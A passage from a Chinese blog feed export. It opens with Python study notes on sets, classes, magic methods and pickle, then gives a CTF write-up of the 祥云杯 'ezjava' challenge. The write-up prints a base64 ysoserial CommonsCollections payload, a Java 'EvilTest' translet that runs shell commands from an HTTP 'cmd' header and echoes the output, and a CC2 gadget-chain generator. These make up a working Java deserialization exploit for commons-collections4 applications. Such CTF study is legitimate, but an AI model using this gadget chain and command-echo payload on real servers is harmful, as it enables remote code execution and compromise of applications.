class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.union(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() 移除数据 从集合中拿数据并删除</span></span><br><span class="line"><span class="comment"># 移除最小的数据并将剩下的数据进行升序排序</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.pop()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># discard()</span></span><br><span class="line"><span class="comment"># update() 更新数据</span></span><br></pre></td></tr></table></figure>

<h3 id="7-面向对象"><a href="#7-面向对象" class="headerlink" title="7.面向对象"></a>7.面向对象</h3><h5 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01:介绍"></a>0x01:介绍</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">面向对象编程：将数据和函数绑定，进行封装，这样能够更快速地开发程序，减少重复代码的重写过程（关注设计思维</span><br><span class="line">————适合做大项目</span><br></pre></td></tr></table></figure>

<p><code>类和对象</code></p>
<p>对象是类的实例</p>
<h5 id="0x02-定义类"><a href="#0x02-定义类" class="headerlink" title="0x02:定义类"></a>0x02:定义类</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class Foo(object):</span></span><br><span class="line"><span class="comment">#    属性</span></span><br><span class="line"><span class="comment">#    方法列表</span></span><br><span class="line"><span class="comment">#    pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span> <span class="comment">#self关键字</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;吃饭&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = Person() <span class="comment">#进行实例化，a为对象</span></span><br><span class="line">a.eat() <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-实例方法、属性、静态方法、类方法"><a href="#0x03-实例方法、属性、静态方法、类方法" class="headerlink" title="0x03:实例方法、属性、静态方法、类方法"></a>0x03:实例方法、属性、静态方法、类方法</h5><p>实例方法：在类的内部，使用def关键字可以定义一个实例方法，与一般函数定义不同，类方法必须包含参数<code>self</code>，且为第一个参数</p>
<p>属性：在类的内部定义的变量（类属性</p>
<p>实例属性：定义在方法里面使用self引用的属性称之为实例属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    native_place=<span class="string">&#x27;&#x27;</span> <span class="comment">#直接写在类里面的变量为类属性</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#实例方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;eat action&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#静态方法</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;静态方法&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#类方法</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cm</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;类方法&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#初始化方法 （构造方法</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.name = <span class="string">&#x27;小明&#x27;</span> <span class="comment">#实例属性</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">p = Person()</span><br></pre></td></tr></table></figure>

<h5 id="0x04-魔术方法"><a href="#0x04-魔术方法" class="headerlink" title="0x04:魔术方法"></a>0x04:魔术方法</h5><p><a href="https://www.cnblogs.com/nmb-musen/p/10861536.html">python 魔术方法</a></p>
<p><a href="https://blog.csdn.net/weixin_44251004/article/details/86503238">常用的魔术方法</a></p>
<table>
<thead>
<tr>
<th>魔术方法</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>__new__</code></td>
<td>在对象实例化的时候最先调用的方法</td>
</tr>
<tr>
<td><code>__init__</code></td>
<td>构造方法</td>
</tr>
<tr>
<td><code>__del__</code></td>
<td>析构方法</td>
</tr>
<tr>
<td><code>__call__</code></td>
<td>当对象被当作函数调用的时候自动调用此方法</td>
</tr>
<tr>
<td><code>__len__</code></td>
<td>当对象被当作len()调用的时候</td>
</tr>
<tr>
<td><code>__repr__</code></td>
<td>当对象被当作repr()调用的时候</td>
</tr>
<tr>
<td><code>__str__</code></td>
<td>当对象被当作str()调用的时候</td>
</tr>
<tr>
<td><code>__bytes__</code></td>
<td>当对象被当作bytes()调用的时候</td>
</tr>
<tr>
<td><code>__hash__</code></td>
<td>当对象被当作hash()调用的时候</td>
</tr>
<tr>
<td><code>__bool__</code></td>
<td>当对象被当作bool()调用的时候，应该返回true或false</td>
</tr>
<tr>
<td><code>__format__</code></td>
<td>当对象被当作format()调用的时候</td>
</tr>
<tr>
<td><code>__getattr__</code></td>
<td>当调用一个不存在的属性的时候执行的行为</td>
</tr>
<tr>
<td><code>__getattribute__</code></td>
<td>当该类的属性被访问时所执行的行为</td>
</tr>
<tr>
<td><code>__setattr__</code></td>
<td>定义当一个属性被设置时的行为</td>
</tr>
<tr>
<td><code>__delattr__</code></td>
<td>定义当一个属性被删除时的行为</td>
</tr>
<tr>
<td><code>__dir__</code></td>
<td>当对象被当作dir()调用时的行为</td>
</tr>
<tr>
<td><code>__get__</code></td>
<td>定义当描述符的值被取得时的行为</td>
</tr>
<tr>
<td><code>__reduce__</code></td>
<td>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）</td>
</tr>
</tbody></table>
<p><strong>简单运用</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="string">&#x27;ameuu&#x27;</span></span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是构造方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是析构方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;对象被当作函数调用&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用了一个不存在的属性&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        student = Person()</span><br><span class="line">        <span class="comment"># pop = base64.b64encode(_pickle.dumps(student))</span></span><br><span class="line">        <span class="comment"># print(pop)</span></span><br><span class="line">        student()</span><br><span class="line">        student.a</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Pickle</code>的<code>dumps</code>和<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>语言学习</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>祥云杯 web</title>
    <url>/2022/10/31/%E7%A5%A5%E4%BA%91%E6%9D%AF-web/</url>
    <content><![CDATA[<h3 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h3><p>下载附件审计</p>
<p>有两个路由hello和myTest，在myTest出直接post传payload，然后进行无限制的反序列化。查看一下lib发现有commons-collections4.0依赖，这就很容易想到CC2或CC4链，直接用yso生成payload进行反弹shell。这里可能是由于一些特殊字符直接hackbar传没有用，所以用python传，但是没有反弹成功</p>
<p>本地测试一下payload对不对</p>
<p>jdk8u66</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ezjava-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>测试的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGmsr+ur4AAAA0ADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAARjYWxjCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTg4MjQ4NzA4NzA4NzAwAQAgTHlzb3NlcmlhbC9Qd25lcjE4ODI0ODcwODcwODcwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABgAAAHUyv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA==</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b22600417f2b4110b4b1b863d890125a.png" alt="Untitled"></p>
<p>本地windows环境下payload测试成功，因为不信邪自己还搭了一个docker环境放到云服务器上，发现反弹shell也是成功了的，说明只有一种可能就是题目不能出网，这样一下子就很难办了</p>
<p>最后经过各种信息搜集，发现可以利用Spring内存马进行回显</p>
<p><a href="http://www.bmth666.cn/bmth_blog/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Spring%E5%86%85%E5%AD%98%E9%A9%AC">http://www.bmth666.cn/bmth_blog/2022/09/27/Spring内存马学习/#Spring内存马</a></p>
<p><a href="https://www.anquanke.com/post/id/258575#h2-2">https://www.anquanke.com/post/id/258575#h2-2</a></p>
<p><a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2021/11/Spring-内存马实现/</a></p>
<p>直接拿从万能的网络中找到的恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTest</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        Method m = c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        Object o = m.invoke(<span class="keyword">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        Method m1 = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        Object resp = m.invoke(o);</span><br><span class="line">        Object req = m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object writer = getWriter.invoke(resp);</span><br><span class="line">        String cmd = (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">        String charsetName = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>))&#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CC2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建TemplatesImpl对象加载字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;ysoserial.payloads.evil.EvilTest&quot;</span>).toBytecode();</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建TranformingComparator 实例</span></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建 PriorityQueue 实例</span></span><br><span class="line">        <span class="comment">//readobject 入口</span></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transformingComparator);</span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改调用方法为newTransformer，加载恶意类。</span></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baor = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baor);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baor.toByteArray())));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //反序列化</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bais);</span></span><br><span class="line"><span class="comment">//        Object o = ois.readObject();</span></span><br><span class="line"><span class="comment">//        baor.close();</span></span><br><span class="line"></span><br><span class="line">    